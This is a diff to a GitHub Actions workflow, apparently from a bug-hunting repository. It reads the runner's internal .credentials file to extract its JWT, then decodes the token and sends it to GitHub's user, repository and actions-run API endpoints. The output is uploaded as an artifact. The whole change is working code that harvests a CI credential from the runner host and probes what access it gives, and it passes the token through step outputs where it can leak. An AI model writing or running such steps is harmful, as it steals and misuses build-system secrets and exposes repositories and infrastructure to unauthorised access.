@@ -9,15 +9,31 @@ jobs:
       - name: Save JWT
         id: jwt
         run: echo "jwt=$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["Data"]["token"])' /home/runner/actions-runner/cached/2.335.1/.credentials)" >> "$GITHUB_OUTPUT"
-      - name: Test broker
+      - name: Test JWT
         run: |
           TOKEN="${{ steps.jwt.outputs.jwt }}"
           echo "Token length: ${#TOKEN}"
-          python3 -c "import json,sys; print(json.loads(sys.argv[1]))" "$TOKEN" 2>&1 | head -5
           echo ""
-          curl -s -w "\nHTTP: %{http_code}" -H "Authorization: Bearer $TOKEN" "https://broker.actions.githubusercontent.com/health"
+          echo "=== 1. Decode JWT payload ==="
+          python3 -c "
+import json, base64
+parts = '$TOKEN'.split('.')
+hdr = parts[0] + '=' * (4 - len(parts[0]) % 4)
+pld = parts[1] + '=' * (4 - len(parts[1]) % 4)
+print('HEADER:')
+print(json.dumps(json.loads(base64.urlsafe_b64decode(hdr)), indent=2))
+print('PAYLOAD:')
+print(json.dumps(json.loads(base64.urlsafe_b64decode(pld)), indent=2))
+"
           echo ""
-          curl -s -w "\nHTTP: %{http_code}" -H "Authorization: Bearer $TOKEN" -H "Upgrade: websocket" -H "Connection: Upgrade" "https://broker.actions.githubusercontent.com/connect"
+          echo "=== 2. Test JWT against api.github.com ==="
+          curl -s -w "\nHTTP: %{http_code}" -H "Authorization: Bearer $TOKEN" "https://api.github.com/user" 2>&1 | head -10
+          echo ""
+          echo "=== 3. Test JWT against repos API ==="
+          curl -s -w "\nHTTP: %{http_code}" -H "Authorization: Bearer $TOKEN" "https://api.github.com/repos/Preshy/aibughunter" 2>&1 | head -5
+          echo ""
+          echo "=== 4. Test JWT against aibughunter's actions API ==="
+          curl -s -H "Authorization: Bearer $TOKEN" "https://api.github.com/repos/Preshy/aibughunter/actions/runs?per_page=3" 2>&1 | head -10
       - uses: actions/upload-artifact@v4
         with:
           name: broker-results
